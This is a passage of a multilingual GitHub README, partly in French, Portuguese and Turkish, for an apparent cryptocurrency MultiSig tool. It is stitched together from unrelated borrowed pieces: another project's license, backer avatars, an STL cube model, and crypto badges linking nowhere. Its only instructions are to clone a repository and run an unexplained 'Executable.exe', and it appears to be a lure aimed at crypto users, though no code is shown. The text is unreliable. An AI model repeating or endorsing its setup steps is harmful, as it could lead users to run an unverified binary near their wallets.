<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>

<p align="right">(<a href="#readme-top">retour au sommet</a>)</p>

<p align="center">
    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
</p>


Vous ne savez pas par où commencer? Rejoignez notre discorde et nous vous aiderons à démarrer!

<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>

<p align="right">(<a href="#readme-top">retour au sommet</a>)</p>

<p align="center">
  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
</p>

## Licence

A large part of this project is licensed under the [Apache 2.0](./LICENSE) license. The only exception are the components under the `ee` (enterprise edition) directory, these are licensed under the [Amplication Enterprise Edition](./ee/LICENSE) license.


<!-- PR -->
## PR

<div align="center">
<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
</div>

<h1 align="center">
    <a href="https://amplication.com/#gh-light-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
    <a href="https://amplication.com/#gh-dark-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
</h1>

<p align="center">
  <i align="center">Construindo aplicativos de sistema com C# e C++ 🚀</i>
</p>

## IDIOMA LEIA-ME

<p align="center">
    LÍNGUAS!
</p>
<p align="center">
    <a href="#EN">INGLÊS</a>
    <a href="#AR">ÁRABE</a>
    <a href="#CH">CHINÊS</a>
    <a href="#FR">FRANCÊS</a>
    <a href="#PR">Português</a>
    <a href="#TR">TURCO</a>
</p>

  
---------------------------------  
  
<p align="center">
  <img src="https://github.com/lastw312/31/assets/170560413/13832f9e-0e59-4dc4-966e-406e9fad20cc" alt="Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️">
</p>

## Ler sobre
As transações MultiSig (multiassinaturas) exigem múltiplas chaves privadas para autorizar uma transação de criptomoeda, aumentando a segurança. Esta configuração garante que nenhuma parte possa movimentar fundos unilateralmente, reduzindo o risco de fraude e acesso não autorizado. O MultiSig é comumente usado em contas corporativas, contas conjuntas e serviços de garantia, fornecendo uma camada adicional de proteção ao exigir múltiplas aprovações para cada transação.

#### **Por favor, leia primeiro o que você precisa.**
#### <p align="Left">(<a href="#what-you-need-1">O QUE VOCÊ PRECISA</a>)</p> 

https://github.com/df123hh/photo/assets/171132664/cb0d4b19-10b2-4c0b-bf9e-062ed641fef4

![ezgif com-animated-gif-maker](https://github.com/df123hh/photo/assets/171132664/69e1f18c-2ced-4c7e-81e7-0035a98f94ce)



```mermaid
erDiagram
    WALLET {
        string id
        string owner
        float balance
    }
    WALLET ||--o{ TRANSACTION : initiates
    WALLET ||--o{ BALANCE : updates
    TRANSACTION ||--o{ CONFIRMATION : confirms
    CONFIRMATION ||--o{ WALLET : updates
    CONFIRMATION ||--o{ BLOCKCHAIN : records
    BLOCKCHAIN }|--o{ TRANSACTION : contains
    BLOCKCHAIN }|--o{ BALANCE : contains
```
### What You Need
----
                    
| Explorer      | Api |
| --------- | -----:|
| Blockchain  | 0000 |
| Etherscan     |   Daf |
| Oklink      |    000 |
| BlockCypher |    ST8 |
| Explorer-Solana |    91 |
                
----
<p align="right">(<a href="#readme-top">de volta ao topo</a>)</p>

<!-- ROADMAP -->
## Roadmap

- [ ] Novo Gui
- [x] Adicionar links de volta ao topo
- [ ] Adicione modelos adicionais com exemplos
- [ ] Novo Features
- [x] Suporte multilíngue
    - [x] chinês
    - [x] Turco
    - [x] Francês
    - [x] Espanhol

<p align="right">(<a href="#readme-top">de volta ao topo</a>)</p>

<!-- GETTING STARTED -->
## Começando

### Pré-requisitos

Este é um exemplo de como listar os itens necessários para usar o software e como instalá-los.
* npm
  ```sh
  npm install npm@latest -g
  ```

### Instalação

1. Download Visual Studio 2022
_usando Git Clone Ou baixe o projeto ou saia do rar. Então baixe o Visual Studio 2022 aqui link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
> Baixe estes


2. Clonar o repositório
   ```sh
   git clone https://github.com/SoonAdd/Addsoon.git
   ```
3. OR

![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)


4. _Então abra o sln (Project Solution) arquivo_

![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)

5. Encontre o arquivo executável
   ```sh
   /ProjectName/Bin/Debug/Executable.exe
   ```
<p align="right">(<a href="#readme-top">de volta ao topo</a>)</p>

```stl
solid cube_corner
  facet normal 0.0 -1.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 1.0 0.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
  facet normal 0.0 0.0 -1.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 1.0 0.0 0.0
    endloop
  endfacet
  facet normal -1.0 0.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 0.0 1.0
      vertex 0.0 1.0 0.0
    endloop
  endfacet
  facet normal 0.577 0.577 0.577
    outer loop
      vertex 1.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
endsolid
```
<p align="right">(<a href="#readme-top">de volta ao topo</a>)</p>

<!-- CONTRIBUTING -->
## Contribuindo
<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>

<p align="right">(<a href="#readme-top">de volta ao topo</a>)</p>

<p align="center">
    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
</p>


Não sabe por onde começar? Junte-se ao nosso discord e nós o ajudaremos a começar!

<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>

<p align="right">(<a href="#readme-top">de volta ao topo</a>)</p>

<p align="center">
  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
</p>

## Licença

Grande parte deste projeto está licenciada sob o [Apache 2.0](./LICENSE) license. A única exceção são os componentes sob o `ee` (enterprise edition) directory, these are licensed under the [Amplication Enterprise Edition](./ee/LICENSE) license.


<!-- TR -->
## TR


<div align="center">
<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
</div>

<h1 align="center">
    <a href="https://amplication.com/#gh-light-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
    <a href="https://amplication.com/#gh-dark-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
</h1>

<p align="center">
  <i align="center">C# ve C++ ile Sistem Uygulamaları Oluşturuyorum. 🚀</i>
</p>

## README Dil

<p align="center">
    DİLLER!
</p>
<p align="center">
    <a href="#EN">İNGİLİZCE</a>
    <a href="#AR">ARAPÇA</a>
    <a href="#CH">ÇİNCE</a>
    <a href="#FR">FRANSIZCA</a>
    <a href="#PR">Portekizce</a>
    <a href="#TR">TÜRKÇE</a>
</p>

  
---------------------------------  
  
<p align="center">
  <img src="https://github.com/lastw312/31/assets/170560413/13832f9e-0e59-4dc4-966e-406e9fad20cc" alt="Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️">
</p>

## Hakkında oku
MultiSig (çoklu imza) işlemleri, bir kripto para birimi işlemine yetki vermek için birden fazla özel anahtar gerektirir ve bu da güvenliği artırır. Bu kurulum, hiçbir tarafın fonları tek taraflı olarak taşıyamamasını sağlayarak dolandırıcılık ve yetkisiz erişim riskini azaltır. MultiSig, kurumsal hesaplarda, ortak hesaplarda ve emanet hizmetlerinde yaygın olarak kullanılır ve her işlem için birden fazla onay gerektirerek ek bir koruma katmanı sağlar.


#### **Lütfen Önce Neye İhtiyacınız Var Kısmını Okuyun.**
#### <p align="Left">(<a href="#what-you-need-1">NEYE İHTİYACIN VAR</a>)</p> 

https://github.com/df123hh/photo/assets/171132664/cb0d4b19-10b2-4c0b-bf9e-062ed641fef4

![ezgif com-animated-gif-maker](https://github.com/df123hh/photo/assets/171132664/69e1f18c-2ced-4c7e-81e7-0035a98f94ce)



```mermaid
erDiagram
    WALLET {
        string id
        string owner
        float balance
    }
    WALLET ||--o{ TRANSACTION : initiates
    WALLET ||--o{ BALANCE : updates
    TRANSACTION ||--o{ CONFIRMATION : confirms
    CONFIRMATION ||--o{ WALLET : updates
    CONFIRMATION ||--o{ BLOCKCHAIN : records
    BLOCKCHAIN }|--o{ TRANSACTION : contains
    BLOCKCHAIN }|--o{ BALANCE : contains
```
### NE GEREKİYOR.
----
                    
| Explorer      | Api |
| --------- | -----:|
| Blockchain  | 0000 |
| Etherscan     |   Daf |
| Oklink      |    000 |
| BlockCypher |    ST8 |
| Explorer-Solana |    91 |
                
----
<p align="right">(<a href="#readme-top">Başa Dönüş</a>)</p>

<!-- ROADMAP -->
## Yol Haritası(HEDEFLER)

- [ ] Yeni Gui
- [x] Başa dön bağlantılarına ekle
- [ ] Örneklerle Ek Şablonlar Ekleme
- [ ] Yeni özellikler
- [x] Çoklu Dil Desteği
    - [x] Çince
    - [x] Türkçe
    - [x] Fransızca
    - [x] İspanyol

<p align="right">(<a href="#readme-top">Başa Dönüş</a>)</p>

<!-- GETTING STARTED -->
## Öncelikle

### Önkoşullar

Bu, yazılımı kullanmak için ihtiyaç duyduğunuz şeylerin nasıl listeleneceğine ve bunların nasıl kurulacağına ilişkin bir örnektir.
* npm
  ```sh
  npm install npm@latest -g
  ```

### Kurulum

1. Download Visual Studio 2022
_Git Clone'u kullanarak Veya projeyi indirin veya rar'dan çıkın. Ardından Visual Studio 2022'yi Buradan İndirin Bağlantı [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
> Bunları İndir


2. Depoyu klonla
   ```sh
   git clone https://github.com/SoonAdd/Addsoon.git
   ```
3. Veya

![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)


4. _Daha sonra Sln Dosyasini Acin (Project Solution) file_

![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)

5. Yürütülebilir Dosyayı Bul
   ```sh
   /ProjectName/Bin/Debug/Executable.exe
   ```
<p align="right">(<a href="#readme-top">Başa Dönüş</a>)</p>

```stl
solid cube_corner
  facet normal 0.0 -1.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 1.0 0.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
  facet normal 0.0 0.0 -1.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 1.0 0.0 0.0
    endloop
  endfacet
  facet normal -1.0 0.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 0.0 1.0
      vertex 0.0 1.0 0.0
    endloop
  endfacet
  facet normal 0.577 0.577 0.577
    outer loop
      vertex 1.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
endsolid
```
<p align="right">(<a href="#readme-top">Başa Dönüş</a>)</p>

<!-- CONTRIBUTING -->
## Katkı
<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>

<p align="right">(<a href="#readme-top">Başa Dönüş</a>)</p>

<p align="center">
    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
</p>


Nereden başlayacağınızdan emin değil misiniz? Discordumuza katılın ve başlamanıza yardımcı olalım!

<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>

<p align="right">(<a href="#readme-top">Başa Dönüş</a>)</p>

<p align="center">
  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
</p>

## Lisans

Bu projenin büyük bir kısmı lisanslıdır. [Apache 2.0](./LICENSE) lisans. Bunun tek istisnası, aşağıdakiler kapsamındaki bileşenlerdir: `ee` (enterprise edition) directory, these are licensed under the [Amplication Enterprise Edition](./ee/LICENSE) license.
